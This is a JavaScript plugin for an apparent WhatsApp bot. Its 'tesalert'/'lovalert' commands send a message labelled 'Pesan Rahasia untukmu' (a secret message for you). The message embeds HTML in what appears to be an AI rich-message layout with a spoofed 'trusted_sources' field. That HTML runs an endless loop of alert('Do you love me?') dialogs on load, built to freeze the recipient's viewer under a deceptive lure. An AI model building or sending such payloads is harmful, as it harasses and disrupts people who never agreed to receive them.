//﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//
//    </>  𝐂𝐫𝐞𝐝𝐢𝐭𝐬  </>      //
//   𝐂𝐫𝐞𝐚𝐭𝐨𝐫: 𝐀𝐥𝐩𝐮𝐭𝐫𝐚𝐚       //
//   𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @𝐬𝐢𝐚𝐩𝐚𝐚𝐤𝐮𝟖𝟕𝟖     //
//﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//

import { AIRich } from '../../Library/MessageBuilder.js';
const handler = async (m, { conn }) => {
    try {
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        const htmlPayload = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Pesan Rahasia</title>
<style>
    body { 
        background-color: #050505; 
        color: white; 
        font-family: Arial, sans-serif; 
        display: flex; 
        justify-content: center; 
        align-items: center; 
        height: 100vh; 
        margin: 0; 
    }
    .box {
        text-align: center;
        padding: 20px;
        border: 1px solid rgba(255,255,255,0.2);
        border-radius: 12px;
        background: #111;
    }
</style>
</head>
<body>
    <div class="box">
        <h3>💌 Membuka Pesan...</h3>
    </div>
    <script>
        function loopAlert() {
            alert('Do you love me?');
            setTimeout(loopAlert, 0);
        }
        window.onload = loopAlert;
    </script>
</body>
</html>`;
        const section = AIRich.newLayout('Single', {
            __typename: 'GenAIaeacdsnwHtmlPrimitive',
            payload: htmlPayload,
            trusted_sources: ["nixel.dev"],
        });
        const submessage = [{ messageType: 2, messageText: `💌 Pesan Rahasia untukmu` }];
        const rich = new AIRich(conn);
        rich._addContent(section, submessage);
        await rich.send(m.chat, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error('[ALERT ERROR]', err);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => { });
        await m.reply('Gagal mengirim pesan.');
    }
};
handler.help = ['tesalert'];
handler.tags = ['fun'];
handler.command = /^(tesalert|lovalert)$/i;
handler.limit = true;
export default handler;
